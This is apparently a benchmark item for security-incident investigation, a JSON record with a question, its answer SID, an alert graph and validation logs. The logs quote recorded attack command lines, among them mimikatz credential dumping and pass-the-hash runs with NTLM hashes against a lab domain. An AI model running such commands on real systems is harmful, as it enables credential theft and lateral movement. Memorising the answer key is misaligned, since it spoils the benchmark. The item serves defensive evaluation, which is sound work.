@@ -1,0 +1,1565 @@
+{
+  "id": "incident_39_train_031",
+  "source_file": "data/excytin-bench/huggingface/questions/train/incident_39_qa_incident_o1-ga_c42.json",
+  "index": 31,
+  "sha256": "51898e3bff27d9ff8efd0c5a129f65cf6eafc3ba35e09b27c5013e938f76b79b",
+  "split": "train",
+  "question_record": {
+    "context": "Involving a security incident where an attacker might be gathering information about potential targets, a series of anomalous account lookups were detected, with activities conducted using the `net.exe` process to query user and group information on the domain. Shortly after, suspicious access to the LSASS service was detected, indicating potential credential theft to obtain clear-text passwords, likely intending lateral movement across the network. This can lead to an attack where overpass-the-hash method is employed for successful logon using stolen credentials.",
+    "question": "Can you identify the Security Identifier (SID) of the account that was used in the overpass-the-hash attack?",
+    "answer": "S-2-2-78",
+    "solution": [
+      "An anomalous chain of attempts to look up user account information has been observed on host `vnevado-win10v`.",
+      "Suspicious access to the LSASS service has been detected, involving the process `lsass.exe`.",
+      "An attacker successfully logged on using an overpass-the-hash attack with the account having SID `S-2-2-78`."
+    ],
+    "start_alert": 94,
+    "end_alert": 52,
+    "start_entities": [
+      18,
+      66,
+      80,
+      81,
+      82,
+      83,
+      84
+    ],
+    "end_entities": [
+      53
+    ],
+    "shortest_alert_path": [
+      94,
+      32,
+      102,
+      56,
+      52
+    ]
+  },
+  "graph_file": "data/excytin-bench/github/secgym/qagen/graph_files/incident_39.graphml",
+  "graph_sha256": "018dbb36a3bc8e4e9df16f3337868296c9796087303c2321abc4a2eda2b79d41",
+  "path": [
+    "94",
+    "32",
+    "102",
+    "56",
+    "52"
+  ],
+  "nodes": {
+    "18": {
+      "type": "entity",
+      "node_type": "process",
+      "identifier_fields": "ExtractedFileName",
+      "value": "net.exe"
+    },
+    "66": {
+      "type": "entity",
+      "node_type": "file",
+      "identifier_fields": "Name",
+      "value": "domaindominance27.ps1"
+    },
+    "80": {
+      "type": "entity",
+      "node_type": "process",
+      "identifier_fields": "ProcessId__CreatedTimeUtc__CommandLine",
+      "value": "2720__2024-06-27t14:32:20.9965284z__\"net.exe\" user /domain"
+    },
+    "81": {
+      "type": "entity",
+      "node_type": "process",
+      "identifier_fields": "ProcessId__CreatedTimeUtc__CommandLine",
+      "value": "6252__2024-06-27t14:32:23.4863625z__\"net.exe\" group \"domain admins\" /domain"
+    },
+    "82": {
+      "type": "entity",
+      "node_type": "process",
+      "identifier_fields": "ProcessId__CreatedTimeUtc__CommandLine",
+      "value": "1700__2024-06-27t14:32:24.729893z__\"net.exe\" group \"enterprise admins\" /domain"
+    },
+    "83": {
+      "type": "entity",
+      "node_type": "process",
+      "identifier_fields": "ProcessId__CreatedTimeUtc__CommandLine",
+      "value": "6264__2024-06-27t14:32:22.2653632z__\"net.exe\" group /domain"
+    },
+    "84": {
+      "type": "entity",
+      "node_type": "process",
+      "identifier_fields": "ProcessId__CreatedTimeUtc__CommandLine",
+      "value": "3560__2024-06-27t14:32:37.0854938z__\"net.exe\" user fk8mq /domain"
+    },
+    "94": {
+      "type": "alert",
+      "name": "Anomalous account lookups",
+      "description": "An anomalous chain of attempts to look up user account information has been observed. An attacker might be gathering information about potential targets."
+    },
+    "32": {
+      "type": "entity",
+      "node_type": "host",
+      "identifier_fields": "HostName",
+      "value": "vnevado-win10v"
+    },
+    "102": {
+      "type": "alert",
+      "name": "Suspicious access to LSASS service",
+      "description": "In order to obtain clear-text password, attackers must decrypt the user's password from the LSASS service's memory. Multiple public tools as well as custom ones could be used to perform this operation. Once obtained, these credentials are often used in lateral movement activities to infiltrate other machines and servers in the network."
+    },
+    "56": {
+      "type": "entity",
+      "node_type": "process",
+      "identifier_fields": "ExtractedFileName",
+      "value": "lsass.exe"
+    },
+    "52": {
+      "type": "alert",
+      "name": "Successful logon using overpass-the-hash with potentially stolen credentials",
+      "description": "An attacker accessed a resource with credentials that might have been obtained using an overpass-the-hash attack. An overpass-the-hash attack typically involves obtaining a password hash from memory and then using the hash to obtain a Kerberos ticket. The ticket is then used to authenticate to network resources."
+    },
+    "53": {
+      "type": "entity",
+      "node_type": "account",
+      "identifier_fields": "Sid",
+      "value": "S-2-2-78"
+    }
+  },
+  "interpretation": {
+    "alerts": 3,
+    "sql_steps_per_variant": 3,
+    "start_alternatives": [
+      {
+        "node": "18",
+        "concept": "Command_File_Mention",
+        "value_literal_in_input": true,
+        "value_casefold_in_input": true
+      },
+      {
+        "node": "66",
+        "concept": "File_Name",
+        "value_literal_in_input": false,
+        "value_casefold_in_input": false
+      },
+      {
+        "node": "80",
+        "concept": "Process_Identity",
+        "value_literal_in_input": false,
+        "value_casefold_in_input": false
+      },
+      {
+        "node": "81",
+        "concept": "Process_Identity",
+        "value_literal_in_input": false,
+        "value_casefold_in_input": false
+      },
+      {
+        "node": "82",
+        "concept": "Process_Identity",
+        "value_literal_in_input": false,
+        "value_casefold_in_input": false
+      },
+      {
+        "node": "83",
+        "concept": "Process_Identity",
+        "value_literal_in_input": false,
+        "value_casefold_in_input": false
+      },
+      {
+        "node": "84",
+        "concept": "Process_Identity",
+        "value_literal_in_input": false,
+        "value_casefold_in_input": false
+      }
+    ],
+    "target_concept": "Account_SID",
+    "weak_links": [
+      "32",
+      "56"
+    ],
+    "scope": "official graph witness, not a proof of causality, actor identity or autonomous planning"
+  },
+  "merged_pm": "pm_6abee9fb5e2869a5",
+  "merged_ems": [
+    "em_afdcb0e9dc74c4fe",
+    "em_d1102041c654bb01",
+    "em_bab3dcef4b9e19c5",
+    "em_7eb864af9d22aeb3",
+    "em_9339ee7c75ce2525"
+  ],
+  "offline_validation": [
+    {
+      "variant": "from_Command_File_Mention",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "ok",
+          "row_count": 1,
+          "expected_node": "32",
+          "expected_present": true,
+          "values": [
+            "vnevado-win10v"
+          ],
+          "evidence": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "entity_index": 20,
+              "entity_ref": "22",
+              "roles": [],
+              "alert_id": "089b219f-5036-c9dd-915e-8ae23b514ed1",
+              "time": "2024-07-04 22:35:03.136659+00:00",
+              "matched_inputs": [
+                "net.exe"
+              ]
+            }
+          ]
+        },
+        {
+          "step": "T2",
+          "status": "ok",
+          "row_count": 9,
+          "expected_node": "56",
+          "expected_present": true,
+          "values": [
+            "get-krbticket.ps1",
+            "lsass.exe",
+            "mimikatz.exe",
+            "powershell.exe"
+          ],
+          "evidence": [
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "mimikatz.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit"
+              },
+              "entity_index": 0,
+              "entity_ref": "2",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "lsass.exe",
+              "raw_components": {
+                "CommandLine": "lsass.exe"
+              },
+              "entity_index": 11,
+              "entity_ref": "13",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "mimikatz.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit"
+              },
+              "entity_index": 18,
+              "entity_ref": "20",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "powershell.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit"
+              },
+              "entity_index": 18,
+              "entity_ref": "20",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "mimikatz.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit"
+              },
+              "entity_index": 19,
+              "entity_ref": "21",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "powershell.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit"
+              },
+              "entity_index": 19,
+              "entity_ref": "21",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "mimikatz.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe C:\\M365DAttack\\Get-KRBTicket.ps1\\\"\" exit -Wait"
+              },
+              "entity_index": 20,
+              "entity_ref": "22",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "powershell.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe C:\\M365DAttack\\Get-KRBTicket.ps1\\\"\" exit -Wait"
+              },
+              "entity_index": 20,
+              "entity_ref": "22",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "get-krbticket.ps1",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe C:\\M365DAttack\\Get-KRBTicket.ps1\\\"\" exit -Wait"
+              },
+              "entity_index": 20,
+              "entity_ref": "22",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            }
+          ]
+        },
+        {
+          "step": "T3",
+          "status": "ok",
+          "row_count": 2,
+          "expected_node": "53",
+          "expected_present": true,
+          "values": [
+            "S-1-5-21-1540151660-3530000288-105586595-1517",
+            "S-2-2-78"
+          ],
+          "evidence": [
+            {
+              "concept": "Account_SID",
+              "graph_value": "S-1-5-21-1540151660-3530000288-105586595-1517",
+              "raw_components": {
+                "Sid": "S-1-5-21-1540151660-3530000288-105586595-1517"
+              },
+              "entity_index": 0,
+              "entity_ref": "2",
+              "roles": [],
+              "alert_id": "a2464305-28e2-a97b-2fe0-d838c74f8294",
+              "time": "2024-07-04 22:35:01.696210+00:00",
+              "matched_inputs": [
+                "lsass.exe"
+              ]
+            },
+            {
+              "concept": "Account_SID",
+              "graph_value": "S-2-2-78",
+              "raw_components": {
+                "Sid": "S-2-2-78"
+              },
+              "entity_index": 4,
+              "entity_ref": "6",
+              "roles": [],
+              "alert_id": "a2464305-28e2-a97b-2fe0-d838c74f8294",
+              "time": "2024-07-04 22:35:01.696210+00:00",
+              "matched_inputs": [
+                "lsass.exe"
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "variant": "from_File_Name",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "ok",
+          "row_count": 1,
+          "expected_node": "32",
+          "expected_present": true,
+          "values": [
+            "vnevado-win10v"
+          ],
+          "evidence": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "entity_index": 20,
+              "entity_ref": "22",
+              "roles": [],
+              "alert_id": "089b219f-5036-c9dd-915e-8ae23b514ed1",
+              "time": "2024-07-04 22:35:03.136659+00:00",
+              "matched_inputs": [
+                "domaindominance27.ps1"
+              ]
+            }
+          ]
+        },
+        {
+          "step": "T2",
+          "status": "ok",
+          "row_count": 9,
+          "expected_node": "56",
+          "expected_present": true,
+          "values": [
+            "get-krbticket.ps1",
+            "lsass.exe",
+            "mimikatz.exe",
+            "powershell.exe"
+          ],
+          "evidence": [
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "mimikatz.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit"
+              },
+              "entity_index": 0,
+              "entity_ref": "2",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "lsass.exe",
+              "raw_components": {
+                "CommandLine": "lsass.exe"
+              },
+              "entity_index": 11,
+              "entity_ref": "13",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "mimikatz.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit"
+              },
+              "entity_index": 18,
+              "entity_ref": "20",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "powershell.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit"
+              },
+              "entity_index": 18,
+              "entity_ref": "20",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "mimikatz.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit"
+              },
+              "entity_index": 19,
+              "entity_ref": "21",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "powershell.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit"
+              },
+              "entity_index": 19,
+              "entity_ref": "21",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "mimikatz.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe C:\\M365DAttack\\Get-KRBTicket.ps1\\\"\" exit -Wait"
+              },
+              "entity_index": 20,
+              "entity_ref": "22",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "powershell.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe C:\\M365DAttack\\Get-KRBTicket.ps1\\\"\" exit -Wait"
+              },
+              "entity_index": 20,
+              "entity_ref": "22",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "get-krbticket.ps1",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe C:\\M365DAttack\\Get-KRBTicket.ps1\\\"\" exit -Wait"
+              },
+              "entity_index": 20,
+              "entity_ref": "22",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            }
+          ]
+        },
+        {
+          "step": "T3",
+          "status": "ok",
+          "row_count": 2,
+          "expected_node": "53",
+          "expected_present": true,
+          "values": [
+            "S-1-5-21-1540151660-3530000288-105586595-1517",
+            "S-2-2-78"
+          ],
+          "evidence": [
+            {
+              "concept": "Account_SID",
+              "graph_value": "S-1-5-21-1540151660-3530000288-105586595-1517",
+              "raw_components": {
+                "Sid": "S-1-5-21-1540151660-3530000288-105586595-1517"
+              },
+              "entity_index": 0,
+              "entity_ref": "2",
+              "roles": [],
+              "alert_id": "a2464305-28e2-a97b-2fe0-d838c74f8294",
+              "time": "2024-07-04 22:35:01.696210+00:00",
+              "matched_inputs": [
+                "lsass.exe"
+              ]
+            },
+            {
+              "concept": "Account_SID",
+              "graph_value": "S-2-2-78",
+              "raw_components": {
+                "Sid": "S-2-2-78"
+              },
+              "entity_index": 4,
+              "entity_ref": "6",
+              "roles": [],
+              "alert_id": "a2464305-28e2-a97b-2fe0-d838c74f8294",
+              "time": "2024-07-04 22:35:01.696210+00:00",
+              "matched_inputs": [
+                "lsass.exe"
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "variant": "from_Process_Identity",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "ok",
+          "row_count": 1,
+          "expected_node": "32",
+          "expected_present": true,
+          "values": [
+            "vnevado-win10v"
+          ],
+          "evidence": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "entity_index": 20,
+              "entity_ref": "22",
+              "roles": [],
+              "alert_id": "089b219f-5036-c9dd-915e-8ae23b514ed1",
+              "time": "2024-07-04 22:35:03.136659+00:00",
+              "matched_inputs": [
+                "1700__2024-06-27t14:32:24.729893z__\"net.exe\" group \"enterprise admins\" /domain",
+                "2720__2024-06-27t14:32:20.9965284z__\"net.exe\" user /domain",
+                "3560__2024-06-27t14:32:37.0854938z__\"net.exe\" user fk8mq /domain",
+                "6252__2024-06-27t14:32:23.4863625z__\"net.exe\" group \"domain admins\" /domain",
+                "6264__2024-06-27t14:32:22.2653632z__\"net.exe\" group /domain"
+              ]
+            }
+          ]
+        },
+        {
+          "step": "T2",
+          "status": "ok",
+          "row_count": 9,
+          "expected_node": "56",
+          "expected_present": true,
+          "values": [
+            "get-krbticket.ps1",
+            "lsass.exe",
+            "mimikatz.exe",
+            "powershell.exe"
+          ],
+          "evidence": [
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "mimikatz.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit"
+              },
+              "entity_index": 0,
+              "entity_ref": "2",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "lsass.exe",
+              "raw_components": {
+                "CommandLine": "lsass.exe"
+              },
+              "entity_index": 11,
+              "entity_ref": "13",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "mimikatz.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit"
+              },
+              "entity_index": 18,
+              "entity_ref": "20",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "powershell.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit"
+              },
+              "entity_index": 18,
+              "entity_ref": "20",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "mimikatz.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit"
+              },
+              "entity_index": 19,
+              "entity_ref": "21",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "powershell.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit"
+              },
+              "entity_index": 19,
+              "entity_ref": "21",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "mimikatz.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe C:\\M365DAttack\\Get-KRBTicket.ps1\\\"\" exit -Wait"
+              },
+              "entity_index": 20,
+              "entity_ref": "22",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "powershell.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe C:\\M365DAttack\\Get-KRBTicket.ps1\\\"\" exit -Wait"
+              },
+              "entity_index": 20,
+              "entity_ref": "22",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "get-krbticket.ps1",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe C:\\M365DAttack\\Get-KRBTicket.ps1\\\"\" exit -Wait"
+              },
+              "entity_index": 20,
+              "entity_ref": "22",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            }
+          ]
+        },
+        {
+          "step": "T3",
+          "status": "ok",
+          "row_count": 2,
+          "expected_node": "53",
+          "expected_present": true,
+          "values": [
+            "S-1-5-21-1540151660-3530000288-105586595-1517",
+            "S-2-2-78"
+          ],
+          "evidence": [
+            {
+              "concept": "Account_SID",
+              "graph_value": "S-1-5-21-1540151660-3530000288-105586595-1517",
+              "raw_components": {
+                "Sid": "S-1-5-21-1540151660-3530000288-105586595-1517"
+              },
+              "entity_index": 0,
+              "entity_ref": "2",
+              "roles": [],
+              "alert_id": "a2464305-28e2-a97b-2fe0-d838c74f8294",
+              "time": "2024-07-04 22:35:01.696210+00:00",
+              "matched_inputs": [
+                "lsass.exe"
+              ]
+            },
+            {
+              "concept": "Account_SID",
+              "graph_value": "S-2-2-78",
+              "raw_components": {
+                "Sid": "S-2-2-78"
+              },
+              "entity_index": 4,
+              "entity_ref": "6",
+              "roles": [],
+              "alert_id": "a2464305-28e2-a97b-2fe0-d838c74f8294",
+              "time": "2024-07-04 22:35:01.696210+00:00",
+              "matched_inputs": [
+                "lsass.exe"
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "live_validation": [
+    {
+      "variant": "route_74f8fd5d594a611c",
+      "seed_concept": "Command_File_Mention",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "episode_id": "em_7eb864af9d22aeb3",
+          "status": "ok",
+          "candidate_count": 27,
+          "unique_values": [
+            "vnevado-win10v"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "089b219f-5036-c9dd-915e-8ae23b514ed1",
+          "witnesses": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "roles": [],
+              "entity_index": 20,
+              "alert_id": "089b219f-5036-c9dd-915e-8ae23b514ed1",
+              "time": "2024-07-17 22:34:56.408798+00:00",
+              "source_row_hash": "03d0074b1cc357fbfeb002a19692f400984dabdf5ff3ad9d8157b7ddeb719af8",
+              "matched_inputs": [
+                "net.exe"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "roles": [],
+              "entity_index": 20,
+              "alert_id": "089b219f-5036-c9dd-915e-8ae23b514ed1",
+              "time": "2024-07-19 22:35:15.157137+00:00",
+              "source_row_hash": "071eb279d249a99d9bb5eee1bc4d9cb705bfae6bfbe4f0571fabc13e89bae4a6",
+              "matched_inputs": [
+                "net.exe"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "roles": [],
+              "entity_index": 20,
